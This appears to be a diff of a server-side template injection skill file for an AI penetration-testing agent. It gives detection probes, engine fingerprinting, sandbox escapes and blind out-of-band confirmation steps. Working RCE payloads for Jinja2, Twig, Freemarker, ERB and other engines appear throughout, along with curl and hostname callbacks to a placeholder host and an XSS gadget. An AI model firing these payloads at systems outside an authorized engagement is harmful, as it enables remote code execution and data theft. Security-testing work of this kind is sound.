@@ -1,6 +1,6 @@
 ---
 name: ssti-testing
-description: Server-side template injection detection, engine identification, and RCE
+description: Detect and exploit server-side template injection for code execution
 origin: Vigil
 vuln_class: ssti
 ---
@@ -9,128 +9,47 @@ vuln_class: ssti
 
 ## When to Activate
 
-- User input rendered in dynamic templates (emails, PDFs, pages)
-- Reflected input shows template-like behavior
-- Error messages reveal template engine names or syntax
+- Input renders through a server-side template (pages, emails, PDFs, SMS, report templates,
+  error pages), reflected input behaves like a template, or an error names an engine.
 
-## Tools
+`--technique SSTI`; deliver via `vigil assess kali exec --technique SSTI --intent "<purpose>"
+--probe-kind payload --phase consume-test --timeout 30 -- curl …`. The universal probe, the
+error fingerprint, and per-engine sandbox escapes and RCE gadgets (Jinja2, Twig,
+Freemarker, Pebble, Thymeleaf, ERB, Smarty, Mako, Velocity, Pug, Handlebars, EL/OGNL):
+`agent/references/payloads/ssti-payloads.md`.
 
-- curl / Burp Suite Repeater
-- SSTImap (automated SSTI detection and exploitation — active successor to tplmap)
-- `vigil oob mint` / `vigil oob poll` (mint binds a nonce under a running interactsh client's id and prints the exact callback host so `vigil oob poll` can correlate blind-SSTI hits — pass `--client <name>` when several clients run; fire the exact host mint prints — see §5 Blind SSTI; replaces reading the listener log by hand)
-- Custom polyglot payloads
+## Method
 
-## Methodology
-
-### 1. Detect Template Injection
-
-- [ ] Inject math probe: `{{7*7}}` — look for `49` in response
-- [ ] Alternate syntaxes: `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `[= 7*7 ]`
-- [ ] String concat: `{{'foo'+'bar'}}` → `foobar`
-- [ ] Polyglot: `${{<%[%'"}}%\.`  — observe which causes errors
-- [ ] Check URL params, POST body, headers, cookie values
-
-### 2. Identify Template Engine
-
-#### Jinja2 / Python
-
-- [ ] `{{config}}` — dumps Flask config
-- [ ] `{{config.items()}}` — enumerate settings
-- [ ] `{{self.__class__.__mro__}}` — MRO chain
-- [ ] `{{request.application.__globals__}}`
-
-#### Twig / PHP
-
-- [ ] `{{_self.env.getFilter('id')}}` (Twig <2)
-- [ ] `{{['id']|filter('system')}}` (Twig 3)
-- [ ] `{{app.request.server.all|join(',')}}` — server vars
-
-#### Freemarker / Java
-
-- [ ] `${7*7}` → `49`
-- [ ] `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
-- [ ] `${object.class.forName("java.lang.Runtime")}`
-
-#### Pebble / Java
-
-- [ ] `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`
-
-#### Thymeleaf / Java
-
-- [ ] `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
-- [ ] URL path-based injection in Spring Boot
-
-#### ERB / Ruby
-
-- [ ] `<%= 7*7 %>` → `49`
-- [ ] `<%= system('id') %>`
-- [ ] `<%= `id` %>`
-
-#### Smarty / PHP
-
-- [ ] `{php}echo `id`;{/php}` (Smarty <3)
-- [ ] `{system('id')}`
-
-### 3. Exploitation — RCE
-
-- [ ] Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
-- [ ] Twig: `{{['id']|filter('system')}}`
-- [ ] Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
-- [ ] ERB: `<%= `whoami` %>`
-- [ ] Confirm with `id`, `whoami`, then escalate
-
-### 4. Sandbox Escape
-
-- [ ] Jinja2: walk MRO to find `subprocess.Popen` or `os.popen`
-- [ ] Restricted engines: enumerate available objects and methods
-- [ ] Chain gadgets through `__subclasses__()`, `__globals__`, `__builtins__`
-
-### 5. Blind SSTI
-
-When `{{7*7}}` evaluates server-side but the result is not reflected back (rendered into a PDF, email, or a fire-and-forget job), out-of-band is the reliable confirmation channel.
-
-- [ ] Time-based: inject sleep or heavy computation
-- [ ] **Out-of-band (preferred):** mint a nonce-tagged callback, embed it in an engine-specific RCE gadget so template execution fires the callback, then poll for the correlated hit:
-      ```bash
-      vigil oob status --json   # confirm readiness
-      vigil oob mint --client <name> --technique ssti --target-url "https://target/profile" --param bio --probe-kind http
-      # -> http  http://<prefix>-<token>.<client-id>.<configured-oob-domain>/   (= $OOB_HOST)
-      ```
-      Embed the EXACT host mint printed (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) in the gadget for the fingerprinted engine and deliver via the kali exec wrapper:
-      ```
-      Jinja2:     {{config.__class__.__init__.__globals__['os'].popen('curl http://$OOB_HOST/').read()}}
-      Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://$OOB_HOST/")}
-      ERB:        <%= `curl http://$OOB_HOST/` %>
-      ```
-      Then correlate instead of grepping the listener log:
-      ```bash
-      vigil oob poll --client <name> --json
-      ```
-      A non-empty `matched` array for your nonce confirms blind RCE — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`). A DNS-only callback (use `--probe-kind dns` and `nslookup`/`$(hostname).<host>` gadgets where curl is stripped) still confirms execution and can exfil one label of data. Empty `matched` after the payload lands → fall back to time-based/error-based and record a runtime issue.
-- [ ] Error-based: force errors that leak data
+1. **Evaluate:** `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `@(7*7)` — 49 vs literal.
+   A `#set`, `<%`, `{%`, `${…}` or `#{…}` token that changes the output's shape (not just its
+   content) is partial parsing: push engine gadgets even without arithmetic.
+2. **Fingerprint by differential** before choosing a payload: `{{7*'7'}}` is `7777777` in Jinja2,
+   `49` in Twig, an error in Freemarker.
+3. **Escalate through the engine's sandbox-escape chain** (`__class__.__mro__`/`__globals__` for
+   Jinja2, `_self.env.registerUndefinedFilterCallback("exec")` then `getFilter` for Twig 1.x,
+   `freemarker.template.utility.Execute`); run only a benign command (`id`, `hostname`).
+4. **Blind** (PDF, email, background job): time-based, error-based, or OOB per
+   `agent/references/offensive-tactics/frp-tunneling.md` "OOB Procedure (mint→poll→correlate)".
+   The gadget must put an evaluated value in the callback (`$(hostname).$OOB_HOST`, or the
+   arithmetic result as a label): mail and link scanners fetch literal URLs in rendered emails, so
+   a bare-host hit does not show the template ran. An empty `matched` with healthy OOB is a target
+   result; fall back to timing and errors.
+5. **Client-side templates** (AngularJS 1.x, Vue 2, Handlebars in the browser) reflecting input in
+   template scope escalate to XSS even when SSTI fails (`{{constructor.constructor('alert(1)')()}}`;
+   `agent/skills/xss-testing/SKILL.md`).
 
 ## What to Record
 
-- Parameter and endpoint where SSTI confirmed
-- Template engine and version identified
-- Proof payload and output
-- Whether sandbox was present and bypassed
-- RCE achieved (yes/no) with evidence
-- Severity: Critical (RCE) or High (info leak)
-- Remediation: use logic-less templates, sandbox, never pass raw user input to template render
+Parameter and endpoint, engine and version, the proof payload and its output, whether a sandbox
+was present and bypassed, and RCE evidence. Severity:
+`agent/references/finding-fp-and-severity-gate.md`; format:
+`agent/references/runtime-guides/web-finding-recording.md`. Evaluation inside a sandbox that held
+is still a finding at the information-disclosure level, with the remaining escape research as the
+next test.
 
-## Kill Signals — Stop Testing When
-- {{7*7}} and all probe variants return literal text (no evaluation) across all parameters → no template injection, move on
-- Template engine identified AND RCE payload succeeds → CRITICAL, record and stop
-- Template engine identified but sandbox blocks all RCE attempts after 5+ chains → record as MEDIUM (sandbox escape may require further research), move on
+## Kill Signals
 
-## Escalate When
-- Any probe variant evaluates: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `@(7*7)` — 49 vs literal means the engine rendered, now fingerprint the engine by differential behavior (`{{7*'7'}}` is `7777777` in Jinja2, `49` in Twig, error in Freemarker) before payload selection
-- The parameter feeds a rendered email, PDF export, SMS body, report template, or error page — server-side template render surfaces are under-audited, test each even when the primary response is JSON
-- Literal evaluation works but direct RCE payloads fail — walk sandbox-escape gadget chains for the fingerprinted engine (`__class__.__mro__` / `config.__class__.__init__.__globals__` for Jinja2, `_self.env.registerUndefinedFilterCallback` for Twig, `freemarker.template.utility.Execute` for Freemarker)
-- Client-side template engines (AngularJS 1.x `{{ }}`, Vue 2 `{{ }}`, Handlebars) reflect user input inside a template scope — CSTI escalates to XSS even when server-side SSTI fails, test `{{constructor.constructor('alert(1)')()}}` style gadgets
-- A `#set`, `<%`, `{%`, `${...}`, or `#{...}` token in input changes the output shape (not just content) — partial template parsing is happening, push engine-specific gadget payloads even without arithmetic evaluation
-
-## Extended Resources
-
-- `agent/references/payloads/ssti-payloads.md` — per-engine detection and RCE (Jinja2, Twig, Pug, Freemarker, ERB, etc.)
+- Every probe variant renders literally across every parameter and render surface → no template
+  injection; record the negative with its run ids (`agent/rules/hunting.md` §13).
+- RCE on one parameter → check the other render surfaces fed by the same template
+  (`agent/rules/hunting.md` §6).
